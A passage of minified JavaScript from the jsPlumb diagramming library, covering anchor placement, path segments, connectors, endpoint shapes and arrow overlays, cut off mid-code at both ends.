null!=g},this.lockCurrentAxis=function(){null!=f&&(v="left"===f||"right"===f?_:b)},this.unlockCurrentAxis=function(){v=null},this.compute=function(t){return r[t.element.id]||i[t.element.id]||[0,0]},this.getCurrentLocation=function(t){return r[t.element.id]||i[t.element.id]||[0,0]},this.getOrientation=function(t){return s[t.id]||[0,0]},this.clearUserDefinedLocation=function(){delete r[e.elementId]},this.setUserDefinedLocation=function(t){r[e.elementId]=t},this.getCssClass=function(){return p}}(e)},clear:function(t){delete r[t],delete i[t]}}},e.AnchorManager.prototype.calculateOrientation=function(t,e,n,o,i,r){var s=["left","top","right","bottom"];if(t===e)return{orientation:"identity",a:["top","top"]};var a=Math.atan2(o.centery-n.centery,o.centerx-n.centerx),l=Math.atan2(n.centery-o.centery,n.centerx-o.centerx),d=[],u={};!function(t,e){for(var n=0;n<t.length;n++)u[t[n]]={left:[e[n].left,e[n].centery],right:[e[n].right,e[n].centery],top:[e[n].centerx,e[n].top],bottom:[e[n].centerx,e[n].bottom]}}(["source","target"],[n,o]);for(var c=0;c<s.length;c++)for(var h=0;h<s.length;h++)d.push({source:s[c],target:s[h],dist:Biltong.lineLength(u.source[s[c]],u.target[s[h]])});d.sort(function(t,e){return t.dist<e.dist?-1:t.dist>e.dist?1:0});for(var p=d[0].source,f=d[0].target,g=0;g<d.length&&(p=!i.isContinuous||i.isEdgeSupported(d[g].source)?d[g].source:null,f=!r.isContinuous||r.isEdgeSupported(d[g].target)?d[g].target:null,null==p||null==f);g++);return i.isContinuous&&i.setCurrentFace(p),r.isContinuous&&r.setCurrentFace(f),{a:[p,f],theta:a,theta2:l}},e.Anchor=function(e){this.x=e.x||0,this.y=e.y||0,this.elementId=e.elementId,this.cssClass=e.cssClass||"",this.userDefinedLocation=null,this.orientation=e.orientation||[0,0],this.lastReturnValue=null,this.offsets=e.offsets||[0,0],this.timestamp=null;var n=!1!==e.relocatable;this.isRelocatable=function(){return n},this.setRelocatable=function(t){n=t};var o=!1!==e.snapOnRelocate;this.isSnapOnRelocate=function(){return o};var i=!1;this.lock=function(){i=!0},this.unlock=function(){i=!1},this.isLocked=function(){return i},t.EventGenerator.apply(this),this.compute=function(t){var e=t.xy,n=t.wh,o=t.timestamp;return t.clearUserDefinedLocation&&(this.userDefinedLocation=null),o&&o===this.timestamp?this.lastReturnValue:(null!=this.userDefinedLocation?this.lastReturnValue=this.userDefinedLocation:this.lastReturnValue=[e[0]+this.x*n[0]+this.offsets[0],e[1]+this.y*n[1]+this.offsets[1],this.x,this.y],this.timestamp=o,this.lastReturnValue)},this.getCurrentLocation=function(t){return t=t||{},null==this.lastReturnValue||null!=t.timestamp&&this.timestamp!==t.timestamp?this.compute(t):this.lastReturnValue},this.setPosition=function(t,e,n,o,r){i&&!r||(this.x=t,this.y=e,this.orientation=[n,o],this.lastReturnValue=null)}},t.extend(e.Anchor,t.EventGenerator,{equals:function(t){if(!t)return!1;var e=t.getOrientation(),n=this.getOrientation();return this.x===t.x&&this.y===t.y&&this.offsets[0]===t.offsets[0]&&this.offsets[1]===t.offsets[1]&&n[0]===e[0]&&n[1]===e[1]},getUserDefinedLocation:function(){return this.userDefinedLocation},setUserDefinedLocation:function(t){this.userDefinedLocation=t},clearUserDefinedLocation:function(){this.userDefinedLocation=null},getOrientation:function(){return this.orientation},getCssClass:function(){return this.cssClass}}),e.FloatingAnchor=function(t){e.Anchor.apply(this,arguments);var n=t.reference,o=t.referenceCanvas,i=e.getSize(o),r=null,s=null;this.orientation=null,this.x=0,this.y=0,this.isFloating=!0,this.compute=function(t){var e=t.xy,n=[e[0]+i[0]/2,e[1]+i[1]/2];return s=n,n},this.getOrientation=function(t){if(r)return r;var e=n.getOrientation(t);return[0*Math.abs(e[0])*-1,0*Math.abs(e[1])*-1]},this.over=function(t,e){r=t.getOrientation(e)},this.out=function(){r=null},this.getCurrentLocation=function(t){return null==s?this.compute(t):s}},t.extend(e.FloatingAnchor,e.Anchor);e.DynamicAnchor=function(t){e.Anchor.apply(this,arguments),this.isDynamic=!0,this.anchors=[],this.elementId=t.elementId,this.jsPlumbInstance=t.jsPlumbInstance;for(var n=0;n<t.anchors.length;n++)this.anchors[n]=(o=t.anchors[n],i=this.jsPlumbInstance,r=this.elementId,o.constructor===e.Anchor?o:i.makeAnchor(o,r,i));var o,i,r;this.getAnchors=function(){return this.anchors};var s=this.anchors.length>0?this.anchors[0]:null,a=s,l=this,d=t.selector||function(t,e,n,o,i){for(var r=n[0]+o[0]/2,s=n[1]+o[1]/2,a=-1,l=1/0,d=0;d<i.length;d++){var u=(c=i[d],h=r,p=s,g=e,void 0,void 0,void 0,void 0,_=(f=t)[0]+c.x*g[0],b=f[1]+c.y*g[1],v=f[0]+g[0]/2,m=f[1]+g[1]/2,Math.sqrt(Math.pow(h-_,2)+Math.pow(p-b,2))+Math.sqrt(Math.pow(v-_,2)+Math.pow(m-b,2)));u<l&&(a=d+0,l=u)}var c,h,p,f,g,_,b,v,m;return i[a]};this.compute=function(t){var e=t.xy,n=t.wh,o=t.txy,i=t.twh;this.timestamp=t.timestamp;var r=l.getUserDefinedLocation();return null!=r?r:this.isLocked()||null==o||null==i?s.compute(t):(t.timestamp=null,s=d(e,n,o,i,this.anchors),this.x=s.x,this.y=s.y,s!==a&&this.fire("anchorChanged",s),a=s,s.compute(t))},this.getCurrentLocation=function(t){return this.getUserDefinedLocation()||(null!=s?s.getCurrentLocation(t):null)},this.getOrientation=function(t){return null!=s?s.getOrientation(t):[0,0]},this.over=function(t,e){null!=s&&s.over(t,e)},this.out=function(){null!=s&&s.out()},this.setAnchor=function(t){s=t},this.getCssClass=function(){return s&&s.getCssClass()||""},this.setAnchorCoordinates=function(t){var e=jsPlumbUtil.findWithFunction(this.anchors,function(e){return e.x===t[0]&&e.y===t[1]});return-1!==e&&(this.setAnchor(this.anchors[e]),!0)}},t.extend(e.DynamicAnchor,e.Anchor);var n=function(t,n,o,i,r,s){e.Anchors[r]=function(e){var a=e.jsPlumbInstance.makeAnchor([t,n,o,i,0,0],e.elementId,e.jsPlumbInstance);return a.type=r,s&&s(a,e),a}};n(.5,0,0,-1,"TopCenter"),n(.5,1,0,1,"BottomCenter"),n(0,.5,-1,0,"LeftMiddle"),n(1,.5,1,0,"RightMiddle"),n(.5,0,0,-1,"Top"),n(.5,1,0,1,"Bottom"),n(0,.5,-1,0,"Left"),n(1,.5,1,0,"Right"),n(.5,.5,0,0,"Center"),n(1,0,0,-1,"TopRight"),n(1,1,0,1,"BottomRight"),n(0,0,0,-1,"TopLeft"),n(0,1,0,1,"BottomLeft"),e.Defaults.DynamicAnchors=function(t){return t.jsPlumbInstance.makeAnchors(["TopCenter","RightMiddle","BottomCenter","LeftMiddle"],t.elementId,t.jsPlumbInstance)},e.Anchors.AutoDefault=function(t){var n=t.jsPlumbInstance.makeDynamicAnchor(e.Defaults.DynamicAnchors(t));return n.type="AutoDefault",n};var o=function(t,n){e.Anchors[t]=function(e){var o=e.jsPlumbInstance.makeAnchor(["Continuous",{faces:n}],e.elementId,e.jsPlumbInstance);return o.type=t,o}};e.Anchors.Continuous=function(t){return t.jsPlumbInstance.continuousAnchorFactory.get(t)},o("ContinuousLeft",["left"]),o("ContinuousTop",["top"]),o("ContinuousBottom",["bottom"]),o("ContinuousRight",["right"]),n(0,0,0,0,"Assign",function(t,e){var n=e.position||"Fixed";t.positionFinder=n.constructor===String?e.jsPlumbInstance.AnchorPositionFinders[n]:n,t.constructorParams=e}),this.jsPlumbInstance.prototype.AnchorPositionFinders={Fixed:function(t,e,n){return[(t.left-e.left)/n[0],(t.top-e.top)/n[1]]},Grid:function(t,e,n,o){var i=t.left-e.left,r=t.top-e.top,s=n[0]/o.grid[0],a=n[1]/o.grid[1],l=Math.floor(i/s),d=Math.floor(r/a);return[(l*s+s/2)/n[0],(d*a+a/2)/n[1]]}},e.Anchors.Perimeter=function(t){var e=(t=t||{}).anchorCount||60,n=t.shape;if(!n)throw new Error("no shape supplied to Perimeter Anchor type");var o=function(){for(var t=2*Math.PI/e,n=0,o=[],i=0;i<e;i++){var r=.5+.5*Math.sin(n),s=.5+.5*Math.cos(n);o.push([r,s,0,0]),n+=t}return o},i=function(t){for(var n=e/t.length,o=[],i=function(t,i,r,s,a){for(var l=(r-t)/(n=e*a),d=(s-i)/n,u=0;u<n;u++)o.push([t+l*u,i+d*u,0,0])},r=0;r<t.length;r++)i.apply(null,t[r]);return o},r=function(t){for(var e=[],n=0;n<t.length;n++)e.push([t[n][0],t[n][1],t[n][2],t[n][3],1/t.length]);return i(e)},s=function(){return r([[0,0,1,0],[1,0,1,1],[1,1,0,1],[0,1,0,0]])},a={Circle:o,Ellipse:o,Diamond:function(){return r([[.5,0,1,.5],[1,.5,.5,1],[.5,1,0,.5],[0,.5,.5,0]])},Rectangle:s,Square:s,Triangle:function(){return r([[.5,0,1,1],[1,1,0,1],[0,1,.5,0]])},Path:function(t){for(var e=t.points,n=[],o=0,r=0;r<e.length-1;r++){var s=Math.sqrt(Math.pow(e[r][2]-e[r][0])+Math.pow(e[r][3]-e[r][1]));o+=s,n.push([e[r][0],e[r][1],e[r+1][0],e[r+1][1],s])}for(var a=0;a<n.length;a++)n[a][4]=n[a][4]/o;return i(n)}};if(!a[n])throw new Error("Shape ["+n+"] is unknown by Perimeter Anchor type");var l=a[n](t);t.rotation&&(l=function(t,e){for(var n=[],o=e/180*Math.PI,i=0;i<t.length;i++){var r=t[i][0]-.5,s=t[i][1]-.5;n.push([r*Math.cos(o)-s*Math.sin(o)+.5,r*Math.sin(o)+s*Math.cos(o)+.5,t[i][2],t[i][3]])}return n}(l,t.rotation));var d=t.jsPlumbInstance.makeDynamicAnchor(l);return d.type="Perimeter",d}}.call("undefined"!=typeof window?window:this),function(){"use strict";var t=this,e=t.jsPlumb,n=t.jsPlumbUtil,o=t.Biltong;e.Segments={AbstractSegment:function(t){this.params=t,this.findClosestPointOnPath=function(t,e){return{d:1/0,x:null,y:null,l:null}},this.getBounds=function(){return{minX:Math.min(t.x1,t.x2),minY:Math.min(t.y1,t.y2),maxX:Math.max(t.x1,t.x2),maxY:Math.max(t.y1,t.y2)}}},Straight:function(t){var n,i,r,s,a,l,d,u=(e.Segments.AbstractSegment.apply(this,arguments),function(){n=Math.sqrt(Math.pow(a-s,2)+Math.pow(d-l,2)),i=o.gradient({x:s,y:l},{x:a,y:d}),r=-1/i});this.type="Straight",this.getLength=function(){return n},this.getGradient=function(){return i},this.getCoordinates=function(){return{x1:s,y1:l,x2:a,y2:d}},this.setCoordinates=function(t){s=t.x1,l=t.y1,a=t.x2,d=t.y2,u()},this.setCoordinates({x1:t.x1,y1:t.y1,x2:t.x2,y2:t.y2}),this.getBounds=function(){return{minX:Math.min(s,a),minY:Math.min(l,d),maxX:Math.max(s,a),maxY:Math.max(l,d)}},this.pointOnPath=function(t,e){if(0!==t||e){if(1!==t||e){var i=e?t>0?t:n+t:t*n;return o.pointOnLine({x:s,y:l},{x:a,y:d},i)}return{x:a,y:d}}return{x:s,y:l}},this.gradientAtPoint=function(t){return i},this.pointAlongPathFrom=function(t,e,n){var i=this.pointOnPath(t,n),r=e<=0?{x:s,y:l}:{x:a,y:d};return e<=0&&Math.abs(e)>1&&(e*=-1),o.pointOnLine(i,r,e)};var c=function(t,e,n){return n>=Math.min(t,e)&&n<=Math.max(t,e)},h=function(t,e,n){return Math.abs(n-t)<Math.abs(n-e)?t:e};this.findClosestPointOnPath=function(t,e){var u={d:1/0,x:null,y:null,l:null,x1:s,x2:a,y1:l,y2:d};if(0===i)u.y=l,u.x=c(s,a,t)?t:h(s,a,t);else if(i===1/0||i===-1/0)u.x=s,u.y=c(l,d,e)?e:h(l,d,e);else{var p=l-i*s,f=(e-r*t-p)/(i-r),g=i*f+p;u.x=c(s,a,f)?f:h(s,a,f),u.y=c(l,d,g)?g:h(l,d,g)}var _=o.lineLength([u.x,u.y],[s,l]);return u.d=o.lineLength([t,e],[u.x,u.y]),u.l=_/n,u}},Arc:function(t){var n=(e.Segments.AbstractSegment.apply(this,arguments),function(e,n){return o.theta([t.cx,t.cy],[e,n])}),i=2*Math.PI;this.radius=t.r,this.anticlockwise=t.ac,this.type="Arc",t.startAngle&&t.endAngle?(this.startAngle=t.startAngle,this.endAngle=t.endAngle,this.x1=t.cx+this.radius*Math.cos(t.startAngle),this.y1=t.cy+this.radius*Math.sin(t.startAngle),this.x2=t.cx+this.radius*Math.cos(t.endAngle),this.y2=t.cy+this.radius*Math.sin(t.endAngle)):(this.startAngle=n(t.x1,t.y1),this.endAngle=n(t.x2,t.y2),this.x1=t.x1,this.y1=t.y1,this.x2=t.x2,this.y2=t.y2),this.endAngle<0&&(this.endAngle+=i),this.startAngle<0&&(this.startAngle+=i);var r=this.endAngle<this.startAngle?this.endAngle+i:this.endAngle;this.sweep=Math.abs(r-this.startAngle),this.anticlockwise&&(this.sweep=i-this.sweep);var s=2*Math.PI*this.radius,a=this.sweep/i,l=s*a;this.getLength=function(){return l},this.getBounds=function(){return{minX:t.cx-t.r,maxX:t.cx+t.r,minY:t.cy-t.r,maxY:t.cy+t.r}};var d=function(t){var e=Math.floor(t),n=Math.ceil(t);return t-e<1e-10?e:n-t<1e-10?n:t};this.pointOnPath=function(e,n){if(0===e)return{x:this.x1,y:this.y1,theta:this.startAngle};if(1===e)return{x:this.x2,y:this.y2,theta:this.endAngle};n&&(e/=l);var o=function(t,e){if(t.anticlockwise){var n=t.startAngle<t.endAngle?t.startAngle+i:t.startAngle;return n-Math.abs(n-t.endAngle)*e}var o=t.endAngle<t.startAngle?t.endAngle+i:t.endAngle,r=Math.abs(o-t.startAngle);return t.startAngle+r*e}(this,e),r=t.cx+t.r*Math.cos(o),s=t.cy+t.r*Math.sin(o);return{x:d(r),y:d(s),theta:o}},this.gradientAtPoint=function(e,n){var i=this.pointOnPath(e,n),r=o.normal([t.cx,t.cy],[i.x,i.y]);return this.anticlockwise||r!==1/0&&r!==-1/0||(r*=-1),r},this.pointAlongPathFrom=function(e,n,o){var i=this.pointOnPath(e,o),r=n/s*2*Math.PI,a=this.anticlockwise?-1:1,l=i.theta+a*r;return{x:t.cx+this.radius*Math.cos(l),y:t.cy+this.radius*Math.sin(l)}}},Bezier:function(n){this.curve=[{x:n.x1,y:n.y1},{x:n.cp1x,y:n.cp1y},{x:n.cp2x,y:n.cp2y},{x:n.x2,y:n.y2}],e.Segments.AbstractSegment.apply(this,arguments),this.bounds={minX:Math.min(n.x1,n.x2,n.cp1x,n.cp2x),minY:Math.min(n.y1,n.y2,n.cp1y,n.cp2y),maxX:Math.max(n.x1,n.x2,n.cp1x,n.cp2x),maxY:Math.max(n.y1,n.y2,n.cp1y,n.cp2y)},this.type="Bezier";var o=function(e,n,o){return o&&(n=t.jsBezier.locationAlongCurveFrom(e,n>0?0:1,n)),n};this.pointOnPath=function(e,n){return e=o(this.curve,e,n),t.jsBezier.pointOnCurve(this.curve,e)},this.gradientAtPoint=function(e,n){return e=o(this.curve,e,n),t.jsBezier.gradientAtPoint(this.curve,e)},this.pointAlongPathFrom=function(e,n,i){return e=o(this.curve,e,i),t.jsBezier.pointAlongCurveFrom(this.curve,e,n)},this.getLength=function(){return t.jsBezier.getLength(this.curve)},this.getBounds=function(){return this.bounds}}},e.SegmentRenderer={getPath:function(t){return{Straight:function(){var e=t.getCoordinates();return"M "+e.x1+" "+e.y1+" L "+e.x2+" "+e.y2},Bezier:function(){var e=t.params;return"M "+e.x1+" "+e.y1+" C "+e.cp1x+" "+e.cp1y+" "+e.cp2x+" "+e.cp2y+" "+e.x2+" "+e.y2},Arc:function(){var e=t.params,n=t.sweep>Math.PI?1:0,o=t.anticlockwise?0:1;return"M"+t.x1+" "+t.y1+" A "+t.radius+" "+e.r+" 0 "+n+","+o+" "+t.x2+" "+t.y2}}[t.type]()}};var i=function(){this.resetBounds=function(){this.bounds={minX:1/0,minY:1/0,maxX:-1/0,maxY:-1/0}},this.resetBounds()};e.Connectors.AbstractConnector=function(t){i.apply(this,arguments);var r=[],s=0,a=[],l=[],d=t.stub||0,u=n.isArray(d)?d[0]:d,c=n.isArray(d)?d[1]:d,h=t.gap||0,p=n.isArray(h)?h[0]:h,f=n.isArray(h)?h[1]:h,g=null,_=null;this.getPathData=function(){for(var t="",n=0;n<r.length;n++)t+=e.SegmentRenderer.getPath(r[n]),t+=" ";return t},this.findSegmentForPoint=function(t,e){for(var n={d:1/0,s:null,x:null,y:null,l:null},o=0;o<r.length;o++){var i=r[o].findClosestPointOnPath(t,e);i.d<n.d&&(n.d=i.d,n.l=i.l,n.x=i.x,n.y=i.y,n.s=r[o],n.x1=i.x1,n.x2=i.x2,n.y1=i.y1,n.y2=i.y2,n.index=o)}return n};var b=function(t,e){e&&(t=t>0?t/s:(s+t)/s);for(var n=a.length-1,o=1,i=0;i<a.length;i++)if(a[i][1]>=t){n=i,o=1===t?1:0===t?0:(t-a[i][0])/l[i];break}return{segment:r[n],proportion:o,index:n}};this.setSegments=function(t){g=[],s=0;for(var e=0;e<t.length;e++)g.push(t[e]),s+=t[e].getLength()},this.getLength=function(){return s};var v=function(t){this.strokeWidth=t.strokeWidth;var e=o.quadrant(t.sourcePos,t.targetPos),n=t.targetPos[0]<t.sourcePos[0],i=t.targetPos[1]<t.sourcePos[1],r=t.strokeWidth||1,s=t.sourceEndpoint.anchor.getOrientation(t.sourceEndpoint),a=t.targetEndpoint.anchor.getOrientation(t.targetEndpoint),l=n?t.targetPos[0]:t.sourcePos[0],d=i?t.targetPos[1]:t.sourcePos[1],h=Math.abs(t.targetPos[0]-t.sourcePos[0]),g=Math.abs(t.targetPos[1]-t.sourcePos[1]);if(0===s[0]&&0===s[1]||0===a[0]&&0===a[1]){var _=h>g?0:1,b=[1,0][_];a=[],(s=[])[_]=t.sourcePos[_]>t.targetPos[_]?-1:1,a[_]=t.sourcePos[_]>t.targetPos[_]?1:-1,s[b]=0,a[b]=0}var v=n?h+p*s[0]:p*s[0],m=i?g+p*s[1]:p*s[1],w=n?f*a[0]:h+f*a[0],j=i?f*a[1]:g+f*a[1],y=s[0]*a[0]+s[1]*a[1],P={sx:v,sy:m,tx:w,ty:j,lw:r,xSpan:Math.abs(w-v),ySpan:Math.abs(j-m),mx:(v+w)/2,my:(m+j)/2,so:s,to:a,x:l,y:d,w:h,h:g,segment:e,startStubX:v+s[0]*u,startStubY:m+s[1]*u,endStubX:w+a[0]*c,endStubY:j+a[1]*c,isXGreaterThanStubTimes2:Math.abs(v-w)>u+c,isYGreaterThanStubTimes2:Math.abs(m-j)>u+c,opposite:-1===y,perpendicular:0===y,orthogonal:1===y,sourceAxis:0===s[0]?"y":"x",points:[l,d,h,g,v,m,w,j],stubs:[u,c]};return P.anchorOrientation=P.opposite?"opposite":P.orthogonal?"orthogonal":"perpendicular",P};return this.getSegments=function(){return r},this.updateBounds=function(t){var e=t.getBounds();this.bounds.minX=Math.min(this.bounds.minX,e.minX),this.bounds.maxX=Math.max(this.bounds.maxX,e.maxX),this.bounds.minY=Math.min(this.bounds.minY,e.minY),this.bounds.maxY=Math.max(this.bounds.maxY,e.maxY)},this.pointOnPath=function(t,e){var n=b(t,e);return n.segment&&n.segment.pointOnPath(n.proportion,!1)||[0,0]},this.gradientAtPoint=function(t,e){var n=b(t,e);return n.segment&&n.segment.gradientAtPoint(n.proportion,!1)||0},this.pointAlongPathFrom=function(t,e,n){var o=b(t,n);return o.segment&&o.segment.pointAlongPathFrom(o.proportion,e,!1)||[0,0]},this.compute=function(t){_=v.call(this,t),s=r.length=a.length=l.length=0,this._compute(_,t),this.x=_.points[0],this.y=_.points[1],this.w=_.points[2],this.h=_.points[3],this.segment=_.segment,function(){for(var t=0,e=0;e<r.length;e++){var n=r[e].getLength();l[e]=n/s,a[e]=[t,t+=n/s]}}()},{addSegment:function(t,n,o){if(o.x1!==o.x2||o.y1!==o.y2){var i=new e.Segments[n](o);r.push(i),s+=i.getLength(),t.updateBounds(i)}},prepareCompute:v,sourceStub:u,targetStub:c,maxStub:Math.max(u,c),sourceGap:p,targetGap:f,maxGap:Math.max(p,f)}},n.extend(e.Connectors.AbstractConnector,i),e.Endpoints.AbstractEndpoint=function(t){return i.apply(this,arguments),{compute:this.compute=function(t,e,n,o){var i=this._compute.apply(this,arguments);return this.x=i[0],this.y=i[1],this.w=i[2],this.h=i[3],this.bounds.minX=this.x,this.bounds.minY=this.y,this.bounds.maxX=this.x+this.w,this.bounds.maxY=this.y+this.h,i},cssClass:t.cssClass}},n.extend(e.Endpoints.AbstractEndpoint,i),e.Endpoints.Dot=function(t){this.type="Dot",e.Endpoints.AbstractEndpoint.apply(this,arguments),t=t||{},this.radius=t.radius||10,this.defaultOffset=.5*this.radius,this.defaultInnerRadius=this.radius/3,this._compute=function(t,e,n,o){this.radius=n.radius||this.radius;var i=t[0]-this.radius,r=t[1]-this.radius,s=2*this.radius,a=2*this.radius;if(n.stroke){var l=n.strokeWidth||1;i-=l,r-=l,s+=2*l,a+=2*l}return[i,r,s,a,this.radius]}},n.extend(e.Endpoints.Dot,e.Endpoints.AbstractEndpoint),e.Endpoints.Rectangle=function(t){this.type="Rectangle",e.Endpoints.AbstractEndpoint.apply(this,arguments),t=t||{},this.width=t.width||20,this.height=t.height||20,this._compute=function(t,e,n,o){var i=n.width||this.width,r=n.height||this.height;return[t[0]-i/2,t[1]-r/2,i,r]}},n.extend(e.Endpoints.Rectangle,e.Endpoints.AbstractEndpoint);var r=function(t){e.jsPlumbUIComponent.apply(this,arguments),this._jsPlumb.displayElements=[]};n.extend(r,e.jsPlumbUIComponent,{getDisplayElements:function(){return this._jsPlumb.displayElements},appendDisplayElement:function(t){this._jsPlumb.displayElements.push(t)}}),e.Endpoints.Image=function(o){this.type="Image",r.apply(this,arguments),e.Endpoints.AbstractEndpoint.apply(this,arguments);var i=o.onload,s=o.src||o.url,a=o.cssClass?" "+o.cssClass:"";this._jsPlumb.img=new Image,this._jsPlumb.ready=!1,this._jsPlumb.initialized=!1,this._jsPlumb.deleted=!1,this._jsPlumb.widthToUse=o.width,this._jsPlumb.heightToUse=o.height,this._jsPlumb.endpoint=o.endpoint,this._jsPlumb.img.onload=function(){null!=this._jsPlumb&&(this._jsPlumb.ready=!0,this._jsPlumb.widthToUse=this._jsPlumb.widthToUse||this._jsPlumb.img.width,this._jsPlumb.heightToUse=this._jsPlumb.heightToUse||this._jsPlumb.img.height,i&&i(this))}.bind(this),this._jsPlumb.endpoint.setImage=function(t,e){var n=t.constructor===String?t:t.src;i=e,this._jsPlumb.img.src=n,null!=this.canvas&&this.canvas.setAttribute("src",this._jsPlumb.img.src)}.bind(this),this._jsPlumb.endpoint.setImage(s,i),this._compute=function(t,e,n,o){return this.anchorPoint=t,this._jsPlumb.ready?[t[0]-this._jsPlumb.widthToUse/2,t[1]-this._jsPlumb.heightToUse/2,this._jsPlumb.widthToUse,this._jsPlumb.heightToUse]:[0,0,0,0]},this.canvas=e.createElement("img",{position:"absolute",margin:0,padding:0,outline:0},this._jsPlumb.instance.endpointClass+a),this._jsPlumb.widthToUse&&this.canvas.setAttribute("width",this._jsPlumb.widthToUse),this._jsPlumb.heightToUse&&this.canvas.setAttribute("height",this._jsPlumb.heightToUse),this._jsPlumb.instance.appendElement(this.canvas),this.actuallyPaint=function(t,e,o){if(!this._jsPlumb.deleted){this._jsPlumb.initialized||(this.canvas.setAttribute("src",this._jsPlumb.img.src),this.appendDisplayElement(this.canvas),this._jsPlumb.initialized=!0);var i=this.anchorPoint[0]-this._jsPlumb.widthToUse/2,r=this.anchorPoint[1]-this._jsPlumb.heightToUse/2;n.sizeElement(this.canvas,i,r,this._jsPlumb.widthToUse,this._jsPlumb.heightToUse)}},this.paint=function(e,n){null!=this._jsPlumb&&(this._jsPlumb.ready?this.actuallyPaint(e,n):t.setTimeout(function(){this.paint(e,n)}.bind(this),200))}},n.extend(e.Endpoints.Image,[r,e.Endpoints.AbstractEndpoint],{cleanup:function(t){t&&(this._jsPlumb.deleted=!0,this.canvas&&this.canvas.parentNode.removeChild(this.canvas),this.canvas=null)}}),e.Endpoints.Blank=function(t){e.Endpoints.AbstractEndpoint.apply(this,arguments),this.type="Blank",r.apply(this,arguments),this._compute=function(t,e,n,o){return[t[0],t[1],10,0]};var o=t.cssClass?" "+t.cssClass:"";this.canvas=e.createElement("div",{display:"block",width:"1px",height:"1px",background:"transparent",position:"absolute"},this._jsPlumb.instance.endpointClass+o),this._jsPlumb.instance.appendElement(this.canvas),this.paint=function(t,e){n.sizeElement(this.canvas,this.x,this.y,this.w,this.h)}},n.extend(e.Endpoints.Blank,[e.Endpoints.AbstractEndpoint,r],{cleanup:function(){this.canvas&&this.canvas.parentNode&&this.canvas.parentNode.removeChild(this.canvas)}}),e.Endpoints.Triangle=function(t){this.type="Triangle",e.Endpoints.AbstractEndpoint.apply(this,arguments);var n=this;(t=t||{}).width=t.width||55,t.height=t.height||55,this.width=t.width,this.height=t.height,this._compute=function(t,e,o,i){var r=o.width||n.width,s=o.height||n.height;return[t[0]-r/2,t[1]-s/2,r,s]}};var s=e.Overlays.AbstractOverlay=function(t){this.visible=!0,this.isAppendedAtTopLevel=!0,this.component=t.component,this.loc=null==t.location?.5:t.location,this.endpointLoc=null==t.endpointLocation?[.5,.5]:t.endpointLocation,this.visible=!1!==t.visible};s.prototype={cleanup:function(t){t&&(this.component=null,this.canvas=null,this.endpointLoc=null)},reattach:function(t,e){},setVisible:function(t){this.visible=t,this.component.repaint()},isVisible:function(){return this.visible},hide:function(){this.setVisible(!1)},show:function(){this.setVisible(!0)},incrementLocation:function(t){this.loc+=t,this.component.repaint()},setLocation:function(t){this.loc=t,this.component.repaint()},getLocation:function(){return this.loc},updateFrom:function(){}},e.Overlays.Arrow=function(t){this.type="Arrow",s.apply(this,arguments),this.isAppendedAtTopLevel=!1,t=t||{};var i=this;this.length=t.length||20,this.width=t.width||20,this.id=t.id;var r=(t.direction||1)<0?-1:1,a=t.paintStyle||{"stroke-width":1},l=t.foldback||.623;this.computeMaxSize=function(){return 1.5*i.width},this.elementCreated=function(n,o){if(this.path=n,t.events)for(var i in t.events)e.on(n,i,t.events[i])},this.draw=function(t,e){var i,s,d,u;if(t.pointAlongPathFrom){if(n.isString(this.loc)||this.loc>1||this.loc<0){var c=parseInt(this.loc,10),h=this.loc<0?1:0;i=t.pointAlongPathFrom(h,c,!1),s=t.pointAlongPathFrom(h,c-r*this.length/2,!1),d=o.pointOnLine(i,s,this.length)}else if(1===this.loc){if(i=t.pointOnPath(this.loc),s=t.pointAlongPathFrom(this.loc,-this.length),d=o.pointOnLine(i,s,this.length),-1===r){var p=d;d=i,i=p}}else if(0===this.loc){if(d=t.pointOnPath(this.loc),s=t.pointAlongPathFrom(this.loc,this.length),i=o.pointOnLine(d,s,this.length),-1===r){var f=d;d=i,i=f}}else i=t.pointAlongPathFrom(this.loc,r*this.length/2),s=t.pointOnPath(this.loc),d=o.pointOnLine(i,s,this.length);var g={hxy:i,tail:u=o.perpendicularLineTo(i,d,this.width),cxy:o.pointOnLine(i,d,l*this.length)},_=a.stroke||e.stroke,b=a.fill||e.stroke;return{component:t,d:g,"stroke-width":a.strokeWidth||e.strokeWidth,stroke:_,fill:b,minX:Math.min(i.x,u[0].x,u[1].x),maxX:Math.max(i.x,u[0].x,u[1].x),minY:Math.min(i.y,u[0].y,u[1].y),maxY:Math.max(i.y,u[0].y,u[1].y)}}return{component:t,minX:0,maxX:0,minY:0,maxY:0}}},n.extend(e.Overlays.Arrow,s,{updateFrom:function(t){this.length=t.length||this.length,this.width=t.width||this.width,this.direction=null!=t.direction?t.direction:this.direction,this.foldback=t.foldback||this.foldback}}),e.Overlays.PlainArrow=function(t){t=t||{};var n=e.extend(t,{foldback:1});e.Overlays.Arrow.call(this,n),this.type="PlainArrow"},n.extend(e.Overlays.PlainArrow,e.Overlays.Arrow),e.Overlays.Diamond=function(t){var n=(t=t||{}).length||40,o=e.extend(t,{length:n/2,foldback:2});e.Overlays.Arrow.call(this,o),this.type="Diamond"},n.extend(e.Overlays.Diamond,e.Overlays.Arrow);var a=function(t,e){return(null==t._jsPlumb.cachedDimensions||e)&&(t._jsPlumb.cachedDimensions=t.getDimensions()),t._jsPlumb.cachedDimensions},l=function(t){e.jsPlumbUIComponent.apply(this,arguments),s.apply(this,arguments);var o=this.fire;this.fire=function(){o.apply(this,arguments),this.component&&this.component.fire.apply(this.component,arguments)},this.detached=!1,this.id=t.id,this._jsPlumb.div=null,this._jsPlumb.initialised=!1,this._jsPlumb.component=t.component,this._jsPlumb.cachedDimensions=null,this._jsPlumb.create=t.create,this._jsPlumb.initiallyInvisible=!1===t.visible,this.getElement=function(){if(null==this._jsPlumb.div){var n=this._jsPlumb.div=e.getElement(this._jsPlumb.create(this._jsPlumb.component));n.style.position="absolute",n.className=this._jsPlumb.instance.overlayClass+" "+(this.cssClass?this.cssClass:t.cssClass?t.cssClass:""),this._jsPlumb.instance.appendElement(n),this._jsPlumb.instance.getId(n),this.canvas=n;var o="translate(-50%, -50%)";n.style.webkitTransform=o,n.style.mozTransform=o,n.style.msTransform=o,n.style.oTransform=o,n.style.transform=o,n._jsPlumb=this,!1===t.visible&&(n.style.display="none")}return this._jsPlumb.div},this.draw=function(t,e,o){var i=a(this);if(null!=i&&2===i.length){var r={x:0,y:0};if(o)r={x:o[0],y:o[1]};else if(t.pointOnPath){var s=this.loc,l=!1;(n.isString(this.loc)||this.loc<0||this.loc>1)&&(s=parseInt(this.loc,10),l=!0),r=t.pointOnPath(s,l)}else{var d=this.loc.constructor===Array?this.loc:this.endpointLoc;r={x:d[0]*t.w,y:d[1]*t.h}}var 